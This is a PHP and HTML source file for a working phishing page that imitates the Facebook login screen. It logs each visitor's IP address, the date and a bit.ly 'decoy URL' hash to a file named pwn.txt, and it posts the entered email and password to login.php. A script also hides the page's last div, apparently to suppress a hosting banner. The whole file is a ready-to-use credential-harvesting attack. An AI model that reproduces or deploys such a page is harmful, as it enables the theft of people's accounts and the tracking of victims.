<?php
  date_default_timezone_set("America/New_York");
	$hashID = $_GET["hashID"];
	$file = fopen("pwn.txt", "a");
	fwrite($file, "\r\n");
  fwrite($file, "Visitor I.P. Address: " . getUserIP());
	fwrite($file, "\r\n");
	fwrite($file, "Date: " . date("F jS, Y"));
	fwrite($file, "\r\n");
	fwrite($file, "Time: " . date("h:i:sa"));
	fwrite($file, "\r\n");
	fwrite($file, "Decoy URL: https://bit.ly/$hashID");
  fwrite($file, "\r\n\n");
	fclose($file);
	function getUserIP() {
		$client  = @$_SERVER['HTTP_CLIENT_IP'];
		$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
		$remote  = $_SERVER['REMOTE_ADDR'];
		if (filter_var($client, FILTER_VALIDATE_IP)) {$ip = $client;}
		elseif (filter_var($forward, FILTER_VALIDATE_IP)) {$ip = $forward;}
		else {$ip = $remote;}
		return $ip;
	}
?>
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, user-scalable=no" />
  <meta charset="UTF-8">
  <style type="text/css">
  body {background-color: #EEE; border: 0; font-family: "Nimbus Sans L"; margin: 0; padding: 0;}
  a {color: #3B5998; font-size: 10pt; text-decoration: none;}
  a:hover {text-decoration: underline;}
  ul {border: 0; color: #333; font-size: 10pt; margin: 0; padding: 8px 0 0 8px;}
  li {display: inline; list-style: none; padding: 0 10px 5px 0;}
  input {background-color: #FFF; border: 1px #DDD solid; display: block; margin: 0; padding: 6px 8px; width: calc(100% - 20px);}
  </style>
  <script type="text/javascript">
  window.onload = function() {document.getElementsByTagName("div")[document.getElementsByTagName("div").length - 1].style.display = "none";};
  </script>
</head>
<body>
<table cellpadding="0" cellspacing="0" style="border: 0; margin: 0; padding: 0; width: 100%;">
  <tr style="background: #3E5C9A; height: 83px;" valign="bottom">
    <td><div style="margin: 0 auto; max-width: 980px; width: 100%;"><img src="logo.png" style="padding: 0 0 10px 0px;" /></div></td>
  </tr>
  <tr>
    <td>
      <div style="background-color: #FFF; border: 0; margin: 80px auto; max-width: 615px; padding: 0; width: 100%;">
        <div style="margin: 0 auto; max-width: 302px; padding: 35px 0 25px 0; width: 100%;">
          <center><font style="font-size: 14pt;">Log into Facebook</font></center><br>
          <form action="login.php" method="POST">
            <input name="email" placeholder="Email or Phone Number" type="text" required><br>
            <input name="password" placeholder="Password" type="password" required><br>
            <input name="hashID" type="hidden" value="<?php print_r($_GET['hashID']); ?>">
            <center><input src="login.png" style="border: 0; margin: 0; padding: 0; width: 100%;" type="image" /></center>
          </form>
          <center><div style="margin: 0 auto; padding: 3px;"><a href="#">Forgot account?</a> <font style="color: #CCC; ">&#183;</font> <a href="#">Sign up for Facebook</a></div></center>
        </div>
      </div>
    </td>
  </tr>
  <tr style="background-color: #FFF;">
    <td>
      <div style="height: 80px;"></div>
      <div style="margin: 0 auto; max-width: 980px; width: 100%;">
        <ul>
          <li>English (US)</li>
          <li><a href="#">Español</a></li>
          <li><a href="#">Français (France)</a></li>
          <li><a href="#">中文(简体)</a></li>
          <li><a href="#">العربية</a></li>
          <li><a href="#">Português (Brasil)</a></li>
          <li><a href="#">Italiano</a></li>
          <li><a href="#">Deutsch</a></li>
          <li><a href="#">हिन्दी</a></li>
          <li><a href="#">日本語</a></li>
        </ul>
        <hr style="background-color: #CCC; border: 0; color: #CCC; height: 1px;">
        <ul>
          <li><a href="#">Sign Up</a></li>
          <li><a href="#">Log In</a></li>
          <li><a href="#">Messenger</a></li>
          <li><a href="#">Facebook Lite</a></li>
          <li><a href="#">Mobile</a></li>
          <li><a href="#">Find Friends</a></li>
          <li><a href="#">Badges</a></li>
          <li><a href="#">People</a></li>
          <li><a href="#">Pages</a></li>
          <li><a href="#">Places</a></li>
          <li><a href="#">Games</a></li>
          <li><a href="#">Locations</a></li>
          <li><a href="#">Celebrities</a></li>
          <li><a href="#">Groups</a></li>
          <li><a href="#">Moments</a></li>
          <li><a href="#">About</a></li>
          <li><a href="#">Create Ad</a></li>
          <li><a href="#">Create Page</a></li>
          <li><a href="#">Developers</a></li>
          <li><a href="#">Careers</a></li>
          <li><a href="#">Privacy</a></li>
          <li><a href="#">Cookies</a></li>
          <li><a href="#">Ad Choices</a></li>
          <li><a href="#">Terms</a></li>
          <li><a href="#">Help</a></li>
          <li><a href="#">Settings</a></li>
          <li><a href="#">Activity Log</a></li>
        </ul>
        <br><font style="color: #666; font-size: 8pt; padding: 0 0 0 8px;">Facebook 2017 &copy;</font><br><br>
      </div>
    </td>
  </tr>
</table>
<div></div>
</body>
</html>
